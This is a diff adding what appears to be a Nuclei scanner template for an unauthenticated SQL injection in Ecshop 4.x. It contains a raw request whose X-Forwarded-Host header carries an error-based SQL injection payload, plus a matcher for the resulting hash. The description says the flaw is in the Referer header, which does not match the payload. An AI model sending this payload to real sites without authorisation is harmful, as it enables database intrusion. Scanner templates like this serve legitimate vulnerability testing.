@@ -1,0 +1,31 @@
+id: ecshop-sqli-4
+
+info:
+  name: Ecshop SQLi 4.x
+  author: Lark-lab,ImNightmaree
+  severity: high
+  description: A vulnerability in Ecshop allows remote unauthenticated users to inject arbitrary SQL statements into via the 'Referer' header field.
+  reference:
+    - https://titanwolf.org/Network/Articles/Article?AID=af15bee8-7afc-4bb2-9761-a7d61210b01a
+    - https://phishingkittracker.blogspot.com/2019/08/userphp-ecshop-sql-injection-2017.html
+  tags: sqli,php,ecshop
+
+requests:
+  - raw:
+      - |
+        GET /user.php?act=collection_list HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:55:"1' and updatexml(1,insert(md5(9999999999)),1,1,0x7e),1) and '";|45ea207d7a2b68c49582d2d22adf953a
+
+    unsafe: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'e0ec043b3f9e198ec09041687e4d4e8d'
+        condition: and
+
+      - type: status
+        status:
+          - 200
